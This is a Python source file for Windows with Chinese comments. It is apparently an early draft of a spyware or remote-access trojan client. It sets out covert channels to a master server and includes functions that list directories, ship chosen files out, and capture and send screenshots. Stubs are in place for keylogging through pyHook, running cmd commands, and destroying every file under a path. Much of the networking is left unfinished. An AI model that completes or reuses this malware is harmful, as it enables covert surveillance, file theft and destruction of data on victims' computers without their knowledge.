# -*- coding:utf-8 -*-
import pyHook
import threading
import pythoncom
import os
import win32api
import win32con
import sys
import chardet
import time
from PIL import ImageGrab
IP=''
#这里需要开启3个端口，
# 一个负责发送信息， threadnewssocket
# 一个负责发送文件   threadfilesocket
# 一个接受主机消息   threadgetorder

######发送文件的线程##############
def sendthread(IP,FILE):
    try:
        if  os.path.exists(FILE):
            with open(FILE, 'rb') as f:
                for data in f:
                    print(data)
                    #s.send(data)
                    pass #发送文件
            #s.send
    except Exception:
        #异常处理
        return
#############发送信息的线程#######
def sendtohost(IP,INFO):
    print(INFO)
    pass
#########获取主服务器的线程######
def  getorderthread():
    try :
        # 1连接主服务器
        # 一直获取信息
        pass
    except Exception:
        # 重新连接
        pass
#发送文件
def sendfiletohost(IP,FILE):
    thread1 = threading.Thread(target=sendthread, args=(IP, FILE,))
    thread1.start()
#获取当前工作目录
def getlocaldir():
    try:
        sendtohost(IP,os.getcwd())
    except Exception:
        pass
#获取当前目录下文件
def getlocalfiledir():
    c=os.listdir(os.getcwd())
    info=''
    for i in c:
        filepath=(os.getcwd()+'\\'+i).decode('GB2312')
        if os.path.isfile(filepath):
            info+=(filepath)
            info+='  file'
            info+='\n'
        else:
            info+=(filepath)
            info+='  document'
            info+='\n'
    sendtohost(IP,info)
#获得上层文件目录
def getthetopfiledir():
    toppath=(os.path.dirname(os.path.dirname(__file__))).decode('gb2312')
    sendtohost(IP,toppath)
#获得文件
def getfile(path,name):
    FILE=path+'\\'+name
    sendfiletohost(IP,FILE)
#强势爆破path目录下
def boomwenjian(path):
    #那就是强势的爆破所有文件233
    pass
#获取截图
def jietu():
    #
    im = ImageGrab.grab()
    name=os.getcwd()+"\\"+time.strftime("%H+%M+%S")+".jpg"
    im.save(name)
    sendfiletohost(IP,name)
#执行cmd
def cmd():
	pass
#键盘事件
def onKeyboardEvent(event):
    return True

#getlocalfiledir()
#getthetopfiledir()
#getfile(os.getcwd(),"pyspy.py")
jietu()